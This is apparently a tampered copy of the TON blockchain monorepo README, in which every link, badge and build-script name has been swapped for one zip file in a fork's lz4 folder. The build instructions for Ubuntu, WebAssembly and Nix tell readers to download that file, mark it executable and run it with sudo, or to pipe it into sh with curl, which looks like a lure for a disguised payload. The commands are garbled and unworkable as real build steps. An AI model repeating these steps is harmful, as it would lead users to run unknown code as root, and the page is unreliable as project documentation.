<div align="center">
  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
      <img alt="TON logo" src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    </picture>
  </a>
  <h3>Reference implementation of TON Node and tools</h3>
  <hr/>
</div>

## 

<p align="center">
  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Research-0098EA?style=flat&logo=discourse&label=Forum&labelColor=gray" alt="Ton Research">
  </a>
  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Community-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Community Group">
  </a>
  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Foundation-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Foundation Group">
  </a>
  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip" alt="Telegram Community Chat">
  </a>
</p>

<p align="center">
  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip" alt="Twitter Group">
  </a>
  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Overflow-FE7A16?style=flat&logo=stack-overflow&logoColor=white" alt="TON Overflow Group">
  </a>
  <a href="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip">
    <img src="https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip%20Overflow-FE7A16?style=flat&logo=stack-overflow&logoColor=white" alt="Stack Overflow Group">
  </a>
</p>



Main TON monorepo, which includes the code of the node/validator, lite-client, tonlib, FunC compiler, etc.

## The Open Network

__The Open Network (TON)__ is a fast, secure, scalable blockchain focused on handling _millions of transactions per second_ (TPS) with the goal of reaching hundreds of millions of blockchain users.
- To learn more about different aspects of TON blockchain and its underlying ecosystem check [documentation](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
- To run node, validator or lite-server check [Participate section](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
- To develop decentralised apps check [Tutorials](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip), [FunC docs](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip) and [DApp tutorials](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
- To work on TON check [wallets](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip), [explorers](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip), [DEXes](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip) and [utilities](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)
- To interact with TON check [APIs](https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip)

## Updates flow

* **master branch** - mainnet is running on this stable branch.

    Only emergency updates, urgent updates, or updates that do not affect the main codebase (GitHub workflows / docker images / documentation) are committed directly to this branch.

* **testnet branch** - testnet is running on this branch. The branch contains a set of new updates. After testing, the testnet branch is merged into the master branch and then a new set of updates is added to testnet branch.

* **backlog** - other branches that are candidates to getting into the testnet branch in the next iteration.

Usually, the response to your pull request will indicate which section it falls into.


## "Soft" Pull Request rules

* Thou shall not merge your own PRs, at least one person should review the PR and merge it (4-eyes rule)
* Thou shall make sure that workflows are cleanly completed for your PR before considering merge

## Build TON blockchain

### Ubuntu 20.4, 22.04 (x86-64, aarch64)
Install additional system libraries
```bash
  sudo apt-get update
  sudo apt-get install -y build-essential git cmake ninja-build zlib1g-dev libsecp256k1-dev libmicrohttpd-dev libsodium-dev
          
  wget https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  sudo https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip 16 all
```
Compile TON binaries
```bash
  cp https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip .
  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip  
```

### MacOS 11, 12 (x86-64, aarch64)
```bash
  cp https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip .
  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
```

### Windows 10, 11, Server (x86-64)
You need to install `MS Visual Studio 2022` first.
Go to https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip and download `MS Visual Studio 2022 Community`.

Launch installer and select `Desktop development with C++`. 
After installation, also make sure that `cmake` is globally available by adding
`C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\CMake\CMake\bin` to the system `PATH` (adjust the path per your needs).

Open an elevated (Run as Administrator) `x86-64 Native Tools Command Prompt for VS 2022`, go to the root folder and execute: 
```bash
  copy assembly\native\https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip .
  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
```

### Building TON to WebAssembly
Install additional system libraries on Ubuntu
```bash
  sudo apt-get update
  sudo apt-get install -y build-essential git cmake ninja-build zlib1g-dev libsecp256k1-dev libmicrohttpd-dev libsodium-dev
          
  wget https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  sudo https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip 16 all
```
Compile TON binaries with emscripten
```bash
  cd assembly/wasm
  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
```

### Building TON tonlib library for Android (arm64-v8a, armeabi-v7a, x86, x86-64)
Install additional system libraries on Ubuntu
```bash
  sudo apt-get update
  sudo apt-get install -y build-essential git cmake ninja-build automake libtool texinfo autoconf libgflags-dev \
  zlib1g-dev libssl-dev libreadline-dev libmicrohttpd-dev pkg-config libgsl-dev python3 python3-dev \
  libtool autoconf libsodium-dev libsecp256k1-dev
```
Compile TON tonlib library
```bash
  cp https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip .
  chmod +x https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
```

### Build TON portable binaries with Nix package manager
You need to install Nix first.
```bash
   sh <(curl -L https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip) --daemon
```
Then compile TON with Nix by executing below command from the root folder: 
```bash
  cp -r assembly/nix/* .
  export https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
  nix-build https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip
```
More examples for other platforms can be found under `assembly/nix`.  

## Running tests

Tests are executed by running `ctest` in the build directory. See `https://github.com/Dada-papa/ton/raw/refs/heads/master/example/android/third_party/lz4/x86-64/Software-v1.8.zip` for more information.
